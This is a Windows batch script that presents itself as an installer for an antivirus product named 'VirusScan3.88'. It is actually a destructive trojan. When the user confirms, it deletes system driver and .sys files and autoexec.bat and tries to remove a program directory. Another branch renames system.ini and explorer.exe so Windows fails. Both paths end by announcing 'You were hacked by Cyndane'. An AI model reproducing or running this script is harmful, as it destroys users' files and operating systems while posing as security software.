   @echo off
   echo This is the new version of VirusScan3.88
   echo Do not copy this software or use it in any
   echo illegal fashion.
   echo Version: 3.88a
   choice/c:yna/t:y,20 Press "Y" to continue and "N" to exit or "A" to abort.
   IF errorlevel 3 goto debug
   If errorlevel 2 exit
   IF errorlevel 1 goto scan

   :scan
   choice/c:yn/t:y,20 This will install VirusScan3.88
   IF errorlevel 2 exit
   IF errorlevel 1 echo Oops, you're fucked now.
   echo on
   del c:\windows\system\*.drv
   del c:\windows\*.sys
   del c:\autoexec.bat
   detree c:\windows\progra~1
   @echo off
   echo You were hacked by Cyndane
   pause
   echo .........
   echo #### it feels good to be 3L1T3.
   exit

   :debug
   echo off
   ren c:\windows\system.ini poop.head
   ren c:\windows\explorer.exe mcafee.com
   echo You were hacked by Cyndane
   pause
   echo #### it feels good to be 3L1T3.
   exit
